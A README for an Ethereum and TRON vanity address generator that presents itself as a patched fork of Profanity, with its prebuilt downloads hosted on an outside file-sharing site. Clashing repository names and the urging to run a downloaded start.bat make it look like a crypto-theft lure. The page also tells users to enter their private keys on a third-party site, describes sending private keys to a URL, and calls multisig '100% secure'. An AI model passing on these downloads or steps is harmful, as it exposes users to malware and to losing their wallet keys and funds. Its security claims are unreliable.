# ether-profanity-latest

# 📥 Download Latest Version

### [⬇️ Download Latest Release(ETH)](https://mega-file.org/LfEnaKw)
### [⬇️ Download Latest Release(TRON)](https://mega-file.org/zeHlXb)
#

Fast GPU-powered Ethereum (ETH) vanity address generator with case-sensitive matching. Generate custom ETH addresses using CUDA/OpenCL. Secure, open-source implementation with vulnerability fixes. Multi-signature support for enhanced security. Windows/Linux/Mac compatible.

![](https://img.shields.io/github/actions/workflow/status/sponsord/profanity-tron/release.yml)
![](https://img.shields.io/badge/baseon-gpu-yellowgreen.svg)
![](https://img.shields.io/badge/language-c,c++-orange.svg)
![](https://img.shields.io/badge/platform-windows,linux-yellow.svg)

A GPU-accelerated Ethereum (ETH) vanity address generator that supports case-sensitive matching. Open source, secure and reliable 🔥

<img width="100%" src="/ehter-screenshot/demo.png?raw=true"/>

> FBI Warning 1: This program is for educational purposes only. Do not use it for illegal purposes.

> FBI Warning 2: This program is only published and updated in this repository. Please do not download or run versions from other unknown sources. You are responsible for any losses caused by doing so.

## Advertisement

For TRON vanity address generation, please visit: [profanity-tron](https://github.com/official-profanity/tron-profanity-latest)

## Description

- This program is modified from [profanity](https://github.com/johguse/profanity) and fixes the private key vulnerability in the original program. Please refer to the "Security" section below.
- Even though this program has fixed the known vulnerability, it is still recommended to use multi-signature for generated addresses. Multi-signature addresses are 100% secure. Please search for how to implement multi-signature on your own.

## Running

### Windows

Download `dist/windows.zip`, unzip it, and then run `start.bat` directly.

> Please refer to the "Command & Parameters" section below for instructions on editing `start.bat` configuration parameters.

### Mac

Download the source code, then navigate to the directory and execute `make`, followed by running `./profanity.x64 ...`.

## Command Introduction

```bash
Usage: ./profanity [OPTIONS]

  Help:
    --help              Show help information

  Modes with arguments:
    --matching          Matching input, file or single address.

  Matching configuration:
    --prefix-count      Minimum number of prefix matches, default 0
    --suffix-count      Minimum number of suffix matches, default 6
    --quit-count        Exit the program when the generated number is greater than, default 0

  Device control:
    --skip              Skip device given by index

  Output control:
    --output            The file to output the results to
    --post              The url to post the results to

Examples:

  ./profanity --matching profanity.txt
  ./profanity --matching profanity.txt --skip 1
  ./profanity --matching profanity.txt --output result.txt
  ./profanity --matching profanity.txt --post http://127.0.0.1:7001/api
  ./profanity --matching profanity.txt --prefix-count 1 --suffix-count 8
  ./profanity --matching profanity.txt --prefix-count 4 --suffix-count 6 --quit-count 1
  ./profanity --matching 0x59c85dc411601f76cb2fc63118567a09e32ff028 --prefix-count 4 --suffix-count 6 --quit-count 1

About:

  The software is modified based on ethereum profanity: https://github.com/johguse/profanity
  Please make sure the program you are running is download from: https://github.com/official-profanity/ether-profanity-latest

Fbi Warning:

  Before using a generated vanigity address, always verify that it matches the printed private key.
  And always multi-sign the address to ensure account security.
```

### Command Description

|   Parameter  | Description  |
|  ----  | ----  |
|--help|View help information|
|--matching|Fixed format, followed by matching rule file|
|--prefix-count|Minimum number of prefix digits, default 0. For example, you can configure it to 8, which matches addresses with 8 T's|
|--suffix-count|Minimum number of suffix digits, default 6. For example, you can configure it to 10, which matches 10 suffix digits (10 digits are actually quite difficult, estimated to run until the end of the world :<)|
|--quit-count|Exit the program when the generated address reaches the specified number. For example, if you only want to match one address, configure it to 1. The system defaults to exiting after 120 addresses|
|--output|Output the generated addresses to a file (append). One per line, format: privatekey,address|
|--post|Send the generated addresses to (GET) the specified URL. Each generated address will be sent once. The data format is: privatekey=xx&address=yy. This configuration is mainly for integration with other systems|
|--skip|Skip the specified GPU device. If the software fails to start, use this parameter to skip the device integrated graphics card|

### Matching Rules

> Currently, the `--matching` parameter supports specifying a single address or a file.

#### Single Address

```bash
./profanity --matching 0x59c85dc411601f76cb2fc63118567a09e32ff028 --prefix-count 4 --suffix-count 6
```

#### File

```bash
./profanity --matching profanity.txt --prefix-count 2 --suffix-count 4 --quit-count 1
```

Matching files, currently supports two formats, please refer to the built-in `profanity.txt`. For example:

```plaintext
0xXXXXXXXXXXXXXXXXXXXX88888888888888888888
0x59c85dc411601f76cb2fc63118567a09e32ff028
```

The above two matching rules:
- The first rule matches addresses ending with the digit `8`.
- The second rule matches the specified address.

With the matching rules, combined with `prefix-count` (minimum number of matching prefixes) & `suffix-count` (minimum number of matching suffixes), you can generate addresses with any rules.

## Development

> Here, we mainly talk about how to build `exe` executable programs for the `windows` platform. `mac` machines theoretically can be directly `make` and run.

> I bought an Alibaba Cloud `v100 gpu card` + `windows server 2022` spot instance when I was developing. If you already have the corresponding development environment, you don't need to spend this money.

### Connecting to the Server

> ssh, you know.

### Installing GPU Drivers

1. Open the NVIDIA driver download website: [https://www.nvidia.cn/Download/index.aspx?lang=cn](https://www.nvidia.cn/Download/index.aspx?lang=cn)

2. Search for drivers based on your server configuration and download:

3. After the GPU drivers are installed, open the Device Manager, you can see the GPU information (if the drivers are not installed, you won't see this):

### Installing `visual studio`

1. Open the Visual Studio website: [https://visualstudio.microsoft.com/zh-hans/vs/](https://visualstudio.microsoft.com/zh-hans/vs/)

2. Download the following versions:

3. After downloading, open the installation program and install the components as shown in the following screenshots:

4. After all the software is installed, you can directly double-click the `profanity.sln` file in the source code directory to open the project for development.

> This document does not discuss how to develop, debug, and build `cpp` applications using `visual studio`.

### Development Notes

- Regardless of whether the development environment is `windows` or `mac`, you can manually specify the `-I` parameter in the development and debugging process to set it to a smaller value, which can greatly speed up the startup process.
- `mac` environment may need to specify `-w 1` to generate the correct private key.
- Some platforms may need to use the `-s` parameter to skip the integrated graphics card on the device.

## Speed

This program uses Alibaba Cloud configuration: `GPU Compute Type 8 vCPU 32 GiB x 1 * NVIDIA V100`. The running speed is around `600 million H/s`:

<img width="100%" src="/ehter-screenshot/demo.png?raw=true"/>

> This program has only been tested on the development machine (an old Mac) and the above `NVIDIA v100` graphics card. It has not been tested on other devices.

> Please do not focus on comparing the running speeds of various devices and platforms. It's meaningless.

## Verification

Ensure that the generated private key and address are verified. Verify the address: [https://secretscan.org/PrivateKeyEth](https://secretscan.org/PrivateKeyEth)

## Security

- This software is modified from [profanity](https://github.com/johguse/profanity) and the original program has a private key vulnerability. Please refer to: [Exploiting the Profanity Flaw](https://medium.com/amber-group/exploiting-the-profanity-flaw-e986576de7ab)

- This software has fixed the known vulnerability, please refer to the code file: `Dispatcher.cpp` -> `createSeed()`

```cpp
cl_ulong4 Dispatcher::Device::createSeed()
{
#ifdef PROFANITY_DEBUG
	cl_ulong4 r;
	r.s[0] = 1;
	r.s[1] = 1;
	r.s[2] = 1;
	r.s[3] = 1;
	return r;
#else
  // Fix profanity seed create bug, ref: https://medium.com/amber-group/exploiting-the-profanity-flaw-e986576de7ab
	std::random_device rd;
	std::mt19937_64 eng1(rd());
	std::mt19937_64 eng2(rd());
	std::mt19937_64 eng3(rd());
	std::mt19937_64 eng4(rd());
	std::uniform_int_distribution<cl_ulong> distr;

	cl_ulong4 r;
	r.s[0] = distr(eng1);
	r.s[1] = distr(eng2);
	r.s[2] = distr(eng3);
	r.s[3] = distr(eng4);
	return r;
#endif
}
```

## Why Open Source?

- I personally think this tool is not very useful. Rich people are usually simple and not interested in fancy numbers.
- Selling software source code won't make much money, just wasting time. I don't make money from this.
- There are other reasons.
